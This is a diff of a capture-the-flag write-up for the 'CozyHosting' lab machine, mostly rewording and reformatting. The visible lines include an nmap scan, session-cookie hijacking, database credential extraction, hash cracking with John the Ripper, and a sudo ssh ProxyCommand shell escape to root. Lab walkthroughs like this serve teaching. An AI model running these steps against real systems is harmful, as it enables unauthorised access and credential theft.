@@ -5,7 +5,7 @@ IP_MACHINE: ip of cozyhosting
 ```
   nmap -sC -sV -p- --min-rate 5000 IP_MACHINE
 ```
-add the domain cozyhosting.htb to the /etc/hosts file and open [ Burpsuite > Proxy > Open Browser ] navigate to route cozyhosting.htb/login. And do a login test with the credentials test:test
+add the domain cozyhosting.htb to the /etc/hosts file and open [ Burpsuite > Proxy > Open Browser ] navigate to route http://cozyhosting.htb/login. And do a login test with the credentials test:test
 ## Cookie Hijacking
 open the [ Developer Tools > Application > Cookies > http://cozyhosting.htb/ ]. Where we can see a cookie that has been generated when trying to log in
 ```
@@ -24,7 +24,7 @@ Now that we have logged in to the administration panel of the web application, w
 Hostname: IP_MACHINE
 Username: test
 ```
-## Getting a reverse shell
+## exploit and get a reverse shell
 already in [Bursuite > Repeater] we have the following message body
 ```
  host=IP_MACHINE&username=test
@@ -57,7 +57,7 @@ To download it to our local machine we use:
 wget IP_MACHINE:8000/cloudhosting-0.0.1.jar
 ```
 ## Reading the database
-To reverse engineer the file we obtained, we opened [ jd-gui > Openfile > cloudhosting-0.0.1.jar ]. and we head to BOOT-INF/classes/application.properties where we will find the postgres database configurations:
+To reverse engineer the file we obtained, we opened [jd-gui > Openfile > cloudhosting-0.0.1.jar]. and we head to BOOT-INF/classes/application.properties where we will find the postgres database configuration:
 ```
 # AN_PASSWORD: is the database password
 spring.datasource.username=postgres
@@ -79,7 +79,7 @@ Within the database we execute the following commands to obtain the authenticati
 \d
 SELECT * FROM users;
 ```
-## Breaking hashes (cryptography)
+### decrypt hash
 which would look like this:
 ```
 # HASHONE: is a hash of 61 characters
@@ -87,7 +87,12 @@ which would look like this:
 kanderson | HASHONE | User
 admin     | HASHTWO | Admin
 ```
-We save them in a hash.txt file and proceed to decrypt the hashes with the John the Ripper tool (This process could take several minutes or even seconds depending on the GPU you have)
+We save the hashes in a *hash.txt* file separated by a line break, that is:
+```
+HASHONE
+HASHTWO
+```
+and we proceed to decrypt the hashes with the John the Ripper tool (This process could take several minutes or even seconds depending on the GPU you have)
 ```
 john --wordlist=$HOME/rockyou.txt hash.txt
 ```
@@ -105,5 +110,7 @@ and we get the first flag *user.txt*
 To escalate privileges and obtain the last *root.txt* flag, simply execute the following commands
 ```
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# get root flag
 cat /root/root.txt
 ```
+### end
